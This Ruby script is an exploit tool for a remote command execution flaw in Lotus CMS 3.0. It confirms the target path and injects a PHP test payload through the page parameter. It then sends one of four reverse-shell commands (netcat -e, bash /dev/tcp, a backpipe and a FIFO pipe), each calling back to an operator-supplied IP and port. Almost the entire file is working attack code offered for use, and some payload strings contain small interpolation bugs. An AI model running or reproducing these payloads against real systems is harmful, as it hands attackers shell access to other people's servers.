#!/usr/bin/env ruby
# Lotus CMS 3.0 eval() Remote Command Execition Exploit
# flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/
#
# By HR & MrGreen
#

require 'optparse'
require 'net/http'
require 'net/https'
require 'rubygems'
require 'colorize'

trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, exiting program now....".red ; exit 666; throw :ctrl_c }
catch :ctrl_c do
	class Clear
		def cls
			if RUBY_PLATFORM =~ /win32/ 
				system('cls')
			else
				system('clear')
			end
		end
	end

	@banner = "     Lotus CMS 3.0 Eval()"
	@banner += "\nRemote Command Execition Exploit"
	@banner += "\n       By: Hood3dRob1n"

	options = {}
	optparse = OptionParser.new do |opts| 
		opts.banner = "Usage:".light_green + "#{$0} ".white + "[".light_green + "OPTIONS".white + "]".light_blue
		opts.separator ""
		opts.separator "EX:".light_green + " #{$0} -t ki0ptrix3.com -p /".white
		opts.separator "EX:".light_green + " #{$0} -t 192.168.1.36 --path /lcms/".white
		opts.separator ""
		opts.separator "Options: ".light_green

		opts.on('-t', '--target <SITE>', "\n\tTarget host running Lotus CMS 3.0".white) do |target|
			options[:site] = target.sub('http://', '').sub('https://','').sub(/\/$/, '')
		end

		opts.on('-p', '--path <PATH>', "\n\tPath to Lotus CMS".white) do |path|
			options[:path] = path.sub(/\/$/, '')
		end

		opts.on('-h', '--help', "\n\tHelp Menu".white) do 
			foo = Clear.new
			foo.cls 
			puts
			puts "#{@banner}".light_green
			puts
			puts opts
			puts
			exit 69
		end
	end

	begin
		foo = ARGV[0] || ARGV[0] = "-h"
		optparse.parse!

		mandatory = [:site, :path]
		missing = mandatory.select{ |param| options[param].nil? }
		if not missing.empty?
			puts "Missing options: ".red + " #{missing.join(', ')}".white  
			puts optparse
			exit
		end


	rescue OptionParser::InvalidOption, OptionParser::MissingArgument
		foo = Clear.new
		foo.cls
		puts $!.to_s.red
		puts
		puts optparse
		puts
		exit 666;
	end
	foo = Clear.new
	foo.cls
	puts
	puts "#{@banner}".light_green
	puts
	@confirm = '#{options[:path]}/index.php?page=index'
	http = Net::HTTP.new("#{options[:site]}", '80')
	response = http.request(Net::HTTP::Get.new(@confirm))

	if response.code =~ /200/
		puts "Confirmed site & path exists".light_green + "!".white
		puts "Running vuln check now".light_green + "...........".white

		@test = "#{options[:path]}/index.php?page=index');${print('Hood3dRob1n')};#"
		http = Net::HTTP.new("#{options[:site]}", '80')
		response = http.request(Net::HTTP::Get.new(URI.encode(@test)))
		if response.body =~ /Hood3dRob1n/
			puts "\tw00t => Injection successful".light_green + "!".white
			puts
			puts "About to try and inject reverse shell".light_green + ".......".white
			puts "what IP to use?".light_green
			ip = gets.chomp
			puts
			puts "What PORT?".light_green
			port = gets.chomp
			puts
			puts "Available Reverse Shell Options: ".light_green
			puts "1: NetCat -e".light_green
			puts "2: NetCat /dev/tcp".light_green
			puts "3: NetCat Backpipe".light_green
			puts "4: NetCat FIFO".light_green
			puts
			puts "Which method should we use to send reverse shell? (".light_green + "1".white + "|".light_green + "2".white + "|".light_green + "3".white + "|".light_green + "4".white + ")".light_green
			method = gets.chomp
			puts
			if method.to_i == 1
				@sploit = "#{options[:path]}/index.php?page=index');${system('nc -e /bin/sh #{ip} #{port}')};#".sub('//', '/')
			elsif method.to_i == 2
				@sploit = "#{options[:path]}/index.php?page=index');${system('/bin/bash -i > /dev/tcp/#{ip}/#{port} 0<&1 2>&1')};#".sub('//', '/')
			elsif method.to_i == 3
				@sploit = "#{options[:path]}/index.php?page=index');${system('mknod backpipe p && nc #{ip} #{port} 0<backpipe | /bin/bash 1>backpipe')};#"
			elsif method.to_i == 4
				@sploit = "#{options[:path]}/index.php?page=index');${system('mkfifo /tmp/foo && cat /tmp/foo | /bin/sh -i 2>&1 | nc #{ip} #{port} > /tmp/foo')};#"
			else
				puts
				puts "Unknown Option provided!".red
				puts
				puts "Going to set method to /dev/tcp and cross fingers, re-run and choose a valid option if you want to set to something else".light_green + ".............".white
				puts
				@sploit = "#{options[:path]}/index.php?page=index');${system('/bin/bash -i > /dev/tcp/$IP/$PORT 0<&1 2>&1')};#".sub('//', '/')
			end

			http = Net::HTTP.new("#{options[:site]}", '80')
			response = http.request(Net::HTTP::Get.new(URI.encode(@sploit)))
			puts
			puts "g0tr00t?".light_green
		end
	else
		puts "Sorry, not finding site! Please check provided path and run again or follow up manually".light_red + "................".white
	end
end#
#EOF
